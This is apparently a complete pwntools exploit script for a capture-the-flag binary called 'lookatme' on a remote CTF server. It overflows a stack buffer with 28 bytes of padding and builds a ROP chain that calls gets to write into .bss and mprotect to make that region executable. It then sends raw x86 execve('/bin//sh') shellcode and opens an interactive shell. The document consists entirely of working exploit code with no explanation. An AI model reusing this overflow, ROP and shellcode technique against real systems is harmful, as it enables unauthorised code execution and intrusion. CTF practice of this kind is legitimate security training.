#!/usr/bin/python3

from pwn import *

#p = process("./lookatme")
p = remote("ctf.j0n9hyun.xyz", 3017)
e = ELF("./lookatme")
#context.log_level = 'debug'

padding = b"A"*28
gets = e.symbols['gets']
mprotect = e.symbols['mprotect']
bss = e.bss()
shell = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"

# Gadget

p3r = 0x80bacfe
p1r = 0x80bad00

# ROP Payload

rop = p32(gets)
rop += p32(p1r)
rop += p32(bss)
rop += p32(mprotect)
rop += p32(p3r)
rop += p32(bss-0xf80)
rop += p32(10000)
rop += p32(7)
rop += p32(bss)

payload = padding + rop
p.sendlineafter("Hellooooooooooooooooooooo\n", payload)

p.sendline(shell)

log.info("gets: " + hex(gets))
log.info("mprotect: " + hex(mprotect))
log.info("bss: " + hex(bss))

p.interactive()
